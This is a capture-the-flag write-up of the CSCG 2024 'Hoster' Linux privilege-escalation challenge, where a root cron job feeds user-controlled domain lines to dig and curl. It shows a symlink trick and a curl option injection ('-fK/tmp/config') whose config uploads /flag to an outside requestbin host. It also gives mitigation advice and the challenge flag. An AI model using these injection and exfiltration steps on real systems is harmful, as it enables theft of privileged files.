---
ctf: CSCG
title: Hoster
authors:
    - name:
      url:
description: You gained access to a Linux server. Can you also gain privileges?
categories:
    - PrivEsc
difficulty: Medium
ctf_year: 2024
challengefiles: hoster
published: "2024-05-23"
---

# TL;DR<a id="TL;DR"></a>

    **- Challenge Setup:** SSH access as low privileged user - `/flag` is only accessible as root
    **- Key Discoveries:** Identifying root cron job via **PSPY** running `dig` and `curl` commands
    **- Vulnerability:** Cron job relying on `/config/domains.txt` is accessible by low privileged user
    **- Exploitation Variant 1:** Creating symlink `/config/domains.txt` to `/flag`
    **- Exploitation Variant 2:** Command option injection using `-K/tmp/config` to upload the flag by the used `curl`

# 1. Introduction<a id="introduction"></a>

The description of this challenge already reveals what kind of ctf type this is gonna be about:

```
You gained access to a Linux server. Can you also gain privileges?
```

# 2. Reconnaissance<a id="reconnaissance"></a>

As you can already read in the challenge description, this challenge is all about privilege escalation on a Linux server. This means you start as a low-privilege user and have to elevate your privileges to root. All you get is SSH access to the challenge machine. You just start as a low-privileged ctf user. Looking around you find the following information: The flag is in the root directory in the `/flag` file which only the root user has read and write access to. So somehow you have to get root to read the flag file and give the content to us. In your home directory in `/config` is a file `domains.txt` but you don’t have enough permissions to read or edit the file. By having a look at the running processes you can see that the cron daemon is running:

![psauxw](ctf/writeups/cscg/hoster/psauxw.png "psauxw")

But nothing is going on in `/etc/crontab` where usually cronjobs are written. So there might be a hidden cronjob running under root. So how can you find out what the cronjob is doing? There is a beautiful tool named **PSPY** snooping all running processes without needing any root permissions. So you can see which commands are being run by other users and cron jobs. Downloading the script from [PSYP](https://github.com/DominicBreuker/pspy) and running it reveals the root cron job:

![pspy](ctf/writeups/cscg/hoster/pspy.png "pspy")

It seems like the cron job is simply running the `request_certificates.sh` script. All this script does is to iterate over each line of your `domains.txt` checking for a valid certificate and then executing the curl command:

```bash
#!/bin/bash

for file in /var/www/*; do
    echo "$file"
    if [ -f $file/config/domains.txt ]
    then
        while IFS="" read -r p || [ -n "$p" ]
        do
            if ( dig "$p" | grep -q 'NXDOMAIN' ) || ( dig "$p" 2>&1 | grep -q 'Invalid' ) || ( dig "$p" | grep -q 'SERVFAIL' )
            then
                echo "[-] Error resolving the domain"
            else
                curl -I "$p"
                # certbot -d "$p"
            fi
        done < $file/config/domains.txt
    else
        echo "[-] Not a file"
    fi
fi
```

So having a look again at the output of **PSPY** the `domains.txt` must contain a line *cscg.de* which is part of the arguments for the curl command.


# 3. Vulnerability Description<a id="vulnerability description"></a>

My initial thoughts were some kind of bash command injection via the *$file* in the first if statement. But sadly you can’t create or edit any directories in `/var/www/` so this won’t work. After playing around for some time I figured out that you can just remove the whole `/config` directory with `rm -rf /config` because you have full permissions over your home directory. So you can just create a new directory `/config` and add your version of the `domains.txt`. Now you have full control over the `domains.txt` and so full control over what is being executed as a command parameter for `dig` and `curl` in the `request_certificates.sh` script.


# 4. Exploitation<a id="exploitation"></a>

## 4.1. Exploitation Variant 1<a id="exploitation variant 1"></a>

My approach was exploiting the script via a symlink with `ln -s  /flag config/domains.txt` pointing to `/flag` so the script would read the content of your flag file and give it as a parameter to the dig command. By running **PSPY** you will just see the dig command being executed with the flag as the parameter. Of course, there are other possible solutions to reveal the flag by `for (( ; ; )); do ps aux >> log; done` effectively spamming `ps aux` and searching for the flag prefix or writing some small script doing this for you:

```bash
search_string="CSCG"
while true; do
    ps_output=$(ps aux)
    if [[ "$ps_output" == *"$search_string"* ]]; then
            echo $ps_output
            break;
    fi
done
```

## 4.2. Exploitation Variant 2<a id="exploitation variant 2"></a>

The intended solution was about command option injection. The problem was to find a parameter fitting both the dig and the `curl` commands and eventually upload the content of `/flag` to your server. With the -K option for `curl` you can define a path of a config file being used by `curl`. But there is a little problem with this parameter. The `dig` command doesn’t have an option -K so the if statement around `dig` in the script will fail. You need another option that won’t result in an output of dig containing *NXDOMAIN*, *Invalid* and *SERVFAIL*. Additionally, this option has to be a valid option for the `curl` command. There were multiple options like the `-f` argument which is the option for a silent fail in `curl` and the option to define a file path for `dig` to interact with. By defining a config file for curl with content like

```bash
echo "-fK/tmp/config" > config/domains.txt
cat <<EOF > /tmp/config
url = https://...pipedream.net
upload-file = /flag
EOF
```

the cronjob will eventually upload the file to your server

![flag-requestbin](ctf/writeups/cscg/hoster/flag_requestbin.png "flag-requestbin")


# 5. Mitigation<a id="mitigation"></a>

At first, you shouldn’t use root cron jobs if not necessary. In this case, a cron job executed by a low-privilege user would have done the job as well by giving the user reading permissions to the `domains.txt` or making it readable for only this user. Another problem was the access the low-privilege ctf user had to the directory where the `domains.txt` was placed. When using a root cron job which interacts with some files always make sure that the files and the parent directories are only accessible by root. If you have to place the file in a directory controlled by another user make the file immutable. It will stay there even when the user tries to modify the directory.

# 6. Flag<a id="flag"></a>

CSCG{1nject1ng\_0pti0ns\_1nste4d\_of\_c0mm4nds}


# 7. References<a id="references"></a>

- [PSPY](https://github.com/DominicBreuker/pspy)
